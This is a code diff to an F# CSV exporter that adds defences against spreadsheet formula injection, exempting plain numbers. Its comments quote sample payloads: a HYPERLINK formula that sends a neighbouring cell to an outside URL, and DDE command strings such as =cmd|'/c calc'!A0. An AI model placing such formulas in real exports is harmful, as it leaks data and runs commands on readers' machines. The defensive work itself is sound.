@@ -77,20 +77,101 @@ let fieldSeparator = ","
 [<Literal>]
 let byteOrderMark = "\uFEFF"
 
-/// One field, quoted per RFC 4180 sections 2.5-2.7.
+// -- Formula injection ------------------------------------------------------
+//
+// A spreadsheet does not read a CSV cell as text. A cell whose first character
+// is `=`, `+`, `-` or `@` is a FORMULA, and so is one beginning with a tab or a
+// carriage return - both are stripped before the leading character is read.
+// That is not a quoting problem and RFC 4180 quoting does not fix it: the
+// reader strips the quotes and evaluates what is inside them.
+//
+// The rows this module serialises come from a `Query` source or from an
+// AI-authored tree, and nothing between there and here inspects a cell's
+// leading character. So `=HYPERLINK("http://…"&A1,"click")` sitting in a data
+// column becomes a live link that exfiltrates the neighbouring cell the moment
+// the reader opens the file they just downloaded, and the classic
+// `=cmd|'/c calc'!A0` is the same shape aimed at the desktop. The download is a
+// gesture the reader made deliberately, which is exactly what makes the file
+// trusted when it opens.
+//
+// The mitigation is OWASP's: prefix a single quote, which every spreadsheet
+// reads as "the rest of this cell is text". Its cost is stated rather than
+// hidden - the exported cell is one character longer than the cell on screen -
+// and it is why the exemption below exists.
+//
+// NEGATIVE NUMBERS ARE EXEMPT, and that exemption is load-bearing. `-` leads
+// every negative number, so neutralising on the character alone would prefix
+// every negative amount in every export and turn a column of numbers into a
+// column of text no reader can sum - a fix that breaks the ordinary case to
+// close the rare one. A field that is a WELL-FORMED NUMBER is left exactly as
+// it is; `-1+cmd|'/c calc'!A0` is not a number and is neutralised. `=`, `@`,
+// TAB and CR are never numbers and are never exempt.
+
+/// The characters that make a spreadsheet treat a cell as a formula when the
+/// cell STARTS with one.
+let formulaLeadIns = [ '='; '+'; '-'; '@'; '\t'; '\r' ]
+
+/// Is this the whole text of a plain decimal number?
+///
+/// Deliberately NOT `Double.TryParse`: that accepts culture-specific
+/// separators, thousands groups, surrounding whitespace, `Infinity` and `NaN`,
+/// and several of those spellings put arbitrary characters after the sign -
+/// which is the exact shape the exemption must not admit. This accepts an
+/// optional single sign, then digits and at most one decimal point, and nothing
+/// else at all.
+let isPlainNumber (value: string) : bool =
+    let body =
+        if value.Length > 0 && (value[0] = '-' || value[0] = '+') then
+            value.Substring 1
+        else
+            value
+
+    let digits = body |> Seq.filter System.Char.IsAsciiDigit |> Seq.length
+    let points = body |> Seq.filter (fun c -> c = '.') |> Seq.length
+
+    body.Length > 0
+    && digits > 0
+    && points <= 1
+    && body |> Seq.forall (fun c -> System.Char.IsAsciiDigit c || c = '.')
+
+/// Neutralise a field a spreadsheet would evaluate. Returns the field unchanged
+/// when there is nothing to neutralise, so an ordinary export is byte-identical
+/// to what it was before this guard existed.
+let neutraliseFormula (value: string) : string =
+    if
+        value.Length > 0
+        && List.contains value[0] formulaLeadIns
+        && not (isPlainNumber value)
+    then
+        "'" + value
+    else
+        value
+
+/// One field: neutralised against formula evaluation, then quoted per RFC 4180
+/// sections 2.5-2.7.
 ///
 /// A field is quoted when it contains the delimiter, a quote, CR or LF; inside
 /// the quotes every embedded quote is doubled. Nothing else is escaped and
 /// nothing is stripped - a value containing a newline keeps its newline, and
 /// the quoting is what makes the record still parse.
 ///
-/// A field that needs no quoting is emitted bare, which is what keeps an
-/// ordinary export free of quotes a reader would then have to look past.
+/// A NEUTRALISED field is quoted too, even where its characters would not
+/// otherwise require it. The quotes are not what makes it safe - the prefix is -
+/// but they mark the substitution in the bytes rather than leaving a bare
+/// apostrophe that reads as part of the value.
+///
+/// A field that needs neither is emitted bare, which is what keeps an ordinary
+/// export free of quotes a reader would then have to look past.
 let escapeField (value: string) : string =
-    let v = if isNull value then "" else value
+    let raw = if isNull value then "" else value
+    let v = neutraliseFormula raw
 
     let needsQuoting =
-        v.Contains "," || v.Contains "\"" || v.Contains "\n" || v.Contains "\r"
+        v.Contains ","
+        || v.Contains "\""
+        || v.Contains "\n"
+        || v.Contains "\r"
+        || v <> raw
 
     if needsQuoting then
         "\"" + v.Replace("\"", "\"\"") + "\""
